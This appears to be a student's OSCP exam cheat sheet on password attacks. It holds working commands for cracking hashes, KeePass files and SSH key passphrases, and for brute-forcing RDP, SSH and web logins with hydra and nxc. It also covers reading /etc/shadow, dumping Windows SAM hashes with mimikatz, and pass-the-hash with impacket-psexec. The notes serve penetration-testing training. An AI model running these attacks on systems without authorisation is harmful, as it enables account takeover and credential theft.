# Passwords
* **ON  OSCP, if password spraying takes more than 15 minutes.. it is not the  correct  path**
## Hash Identify
```bash
hashid 'hash'
hash-identifier 'hash'
hashcat --help | grep -i "KeePass"
```
## Clean up creds/hashes
```bash
awk 'NF {print $1}` dumped_hashes.txt | sort | uniq | tee unique_hashes.txt
john unique_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
```
## Cracking
```bash
john --wordlist=$rockyou the_hash
john --wordlist=ssh.passwords --rules=[CUSTOM_RULE_GOES_HERE] ssh.hash
john hash --show

hashcat -h | grep -i "ssh"      
hashcat -m MODE_NUM 'hash' 'wordlist' --force
hashcat -m 22921 ssh.hash ssh.passwords  --force
hashcat -m 1800 -a 0  roothash.txt $rockyou --force -o cracked
hashcat -m 0 hash.txt $rockyou my.rule --force -o cracked
hashcat -m  0 hash.txt --show
```
## Password Lists
```bash
locate seclists | grep -i ssh
/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt
/usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt

head /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt
# convert to user list and pass list
cat /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt | cut -d ":" -f1 > user
cat /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt| cut -d ":" -f2 > user

# JtR password list, simpler wordlist than rockyou.txt
locate password.lst

# grab first 20 lines of file
head -n 20 /usr/share/john/password.lst   
```
## KDBX Files
```powershell
# Find on Windows
dir /s /b c:\*.kdbx 
Get-ChildItem c:\ -Recurse -Filter *.kdbx -ErrorAction SilentlyContinue

#Cracking
keepass2john Database.kdbx > keepasshash
john --wordlist=$rockyou keepasshash

# keepass2john added, 'Database' user field in front of hash.  Remove for hashcat
hashcat --help | grep -i "KeePass"
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```
## RDP 
```bash
# View password policy with win cmd 'net accounts'
# nxc seems to be better for RDP vs Hydra
# grab a username list from here, xato-net-10-million is liek  rock you
/usr/share/seclists/Usernames
nxc rdp <ip> -u list.txt -p 'mypassword'
nxc rdp 192.168.110.227 -u 'nadine' -p "$rockyou" --ignore-pw-decoding

hydra  rdp://192.168.110.227 -l 'nadine' -P $rockyou  

# check for valid login
impacket-rdp_check

# trying impacket as backup too
for i in $(cat userlist) ; do echo "trying ${i}.."; impacket-rdp_check ${i}: 'password'@192.168.1.IP; echo "\n" ; done
for i in $(cat UserList); do echo "Trying ${i}..."; impacket-rdp_check ${i}:'SuperS3cure1337#'192.168.107.202; echo "\n" ; done
```
## SMB
```bash

```
## SSH
```bash
# Try Default Creds, think admin:admin, root:calvin
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt  ssh://<IP>:2222  -I

# remove comments
sed '/^#/d' /usr/share/john/password.lst > clean_passwd.lst

hydra -l george -P clean_passwd.lst ssh://<IP>:2222  -I
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<IP>


```
### SSH Private Key Passphrase
- Often found via WWW Directory Traversal 
```bash
# connect with id_rsa
chmod 600 id_rsa                 # Set permissions on our found SSH PRIV KEY
ssh -i id_rsa dave@192.168.IP -p 2222  

### Cracking SSH Priv Key passphrase
# 1. convert id_rsa hash to john format
ssh2john id_rsa > ssh.hash      

# For HASHCAT, with text editor, remove any leading filenames before $6 in file ssh.hash
# For John, the file should be g2g

# find correct -m mode to use
hashcat -h | grep -i "ssh"      
hashcat -m 22921 ssh.hash ssh.passwords  --force

### Custom Rule SET password policy
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force

# if hashcat throws an error, use john instead
john --wordlist=ssh.passwords --rules=[CUSTOM_RULE_GOES_HERE] ssh.hash

###Updating /etc/john/john.conf for custom RULE list
# 3 numbers, A cap Passwords need 3 numbers, a capital letter and a special character
# ssh.rule :  a password 'word' and convert it to 'Word000!' 'Word000@' 'Word000# 'Word001!' etc
[List.Rules:sshPWKRules]
c $[0-9] $[0-9] $[0-9] $!
c $[0-9] $[0-9] $[0-9] $@
c $[0-9] $[0-9] $[0-9] $#

# append john.conf
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'

### Create customized password list from rule set
john --wordlist=ssh.passwords --rules=sshPWKRules --stdout > chp16passwords.txt
```
## WWW
### HTTP  Basic Auth
* We identify basic basic auth because won't see a POST with a user/pass variable at the bottom, just the GET
* for http basic auth, we can crack with *http-get* or *http-post*
```bash
hydra -l admin -P rockyou.txt 192.168.168.201 http-get /admin/ -V
hydra -l admin -P rockyou.txt 192.168.168.201 http-post /admin/ -V
```
### HTTP POST Login
* Always try login with default creds first : admin:admin, check documentation
* Then try bruteforce with rockyou.txt
* HYDRA Brute Force Overview: 
	1. Capture failed login attempt in Burp
	2. Burp -> Intercept ON -> Attempt  to login
	3. Forward Request, Identify *FAILED* login attempt
	4. Use *FAILED l*ogin text for Failed login identifier in the http-post-form
* **http-post-form**
* http-post-form requires 3 COLON `:` delimited  fields
		1. location of login form *index.php*
		2. request body, user/pass *fm_usr=user&fm_pwd=^PASS^*
		3. Failed login identifier: *Login failed. Invalid*
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

# view help
hydra service http-post-form -U
hydra service http-get -U

# Send Hyrda to burp
export HYDRA_PROXY_HTTP=http://127.0.0.1:8080
```

## Linux PASSWD/SHADOW
- Linux stores pass /etc/shadow, Root can R/W to shadow file
- Common Password Hash Encryption Types

| \$1\$         | MD5      |
| ------------- | -------- |
| \$2a\$/\$2y\$ | Blowfish |
| \$5\$         | SHA-256  |
| \$6\$         | SHA-512  |
| \$y\$         | yescrypt |

```bash
# look for valid login shell, real user not service
cat /etc/passwd | grep sh

# get liv privesc for shadow file
unshadow password-file shadow-file
sudo unshadow /etc/passwd /etc/shadow > hashoutput

#  yescrypt  $y$  -- crack with john
john -w=rockyou.txt hash --format=crypt
```
## Windows OS Credential dumping
- Makes sure you always get LOCAL RID 500 administrators
	- This is useful for password re-use
- Reghives
- SAM c:\windows\system32\config\SAM
- SYSTEM -  has system boot key, and  has  secret material protecting things in SAM
- need both SAM and SYSTEM  to crack hashes
```powershell
# Launch CMD/powershell terminal as Administrator
# load mimikatz
# dump sam
.\mimikatz.exe "log users.log" "privilege::debug"  "token::elevate" "lsadump::sam" "exit"
hashcat --help | grep -i ntlm
hashcat ntlmhash rockyou.txt -m 1000
```
- create users file, and file with hashes from dump
- check  with nxc and enumerate shares 
```powershell
  nxc smb ip -u users -H hashes --shares

# use psexec/wmiexec with hash now to get shell
rlwrap impacket-psexec administrator@192.168.ip -hashes :hashvalue
# should be SYSTEM
# we are system because it uploads a binary, RENCOM binary, that abuses named pipe to use RPC to make a service 
# alternate  RDP tool "Remmina"
  ```
## MSSQL
```bash
# OSCP A - attempted password spray via MSSQL, failed
nxc mssql 10.10.158.142 --local-auth -u 'sa'  -p  /usr/share/wordlists/rockyou.txt  --ignore-pw-decoding
```
